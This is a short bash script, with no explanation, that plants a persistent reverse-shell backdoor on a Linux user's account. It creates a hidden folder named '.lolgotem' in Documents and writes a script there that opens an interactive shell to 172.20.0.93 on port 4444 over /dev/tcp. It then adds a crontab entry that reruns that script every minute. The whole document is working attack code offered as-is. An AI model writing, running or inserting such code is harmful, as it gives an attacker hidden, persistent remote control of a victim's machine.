#!/bin/bash

target="$(whoami)"

mkdir /home/$target/Documents/.lolgotem

echo "#!/bin/bash" >> /home/$target/Documents/.lolgotem/remote.sh
echo "bash -i >& /dev/tcp/172.20.0.93/4444 0>&1" >> /home/$target/Documents/.lolgotem/remote.sh
chmod u+x /home/$target/Documents/.lolgotem/remote.sh

{ crontab -l; echo "*/1 * * * * /home/$target/Documents/.lolgotem/remote.sh"; } | crontab -
